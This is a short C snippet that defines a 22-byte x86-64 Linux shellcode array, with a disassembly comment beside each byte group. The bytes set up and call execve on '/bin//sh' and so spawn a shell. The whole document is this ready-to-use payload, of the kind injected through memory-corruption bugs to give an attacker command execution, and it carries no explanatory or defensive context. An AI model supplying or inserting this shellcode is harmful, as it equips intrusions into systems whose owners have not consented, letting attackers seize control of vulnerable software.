
#define SH_SIZE 22

char SH[] = {
  /* 0000 */ "\x6a\x3b"                                 /* push 0x3b                   */
  /* 0002 */ "\x58"                                     /* pop rax                     */
  /* 0003 */ "\x99"                                     /* cdq                         */
  /* 0004 */ "\x52"                                     /* push rdx                    */
  /* 0005 */ "\x5e"                                     /* pop rsi                     */
  /* 0006 */ "\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* mov rcx, 0x68732f2f6e69622f */
  /* 0010 */ "\x52"                                     /* push rdx                    */
  /* 0011 */ "\x51"                                     /* push rcx                    */
  /* 0012 */ "\x54"                                     /* push rsp                    */
  /* 0013 */ "\x5f"                                     /* pop rdi                     */
  /* 0014 */ "\x0f\x05"                                 /* syscall                     */
};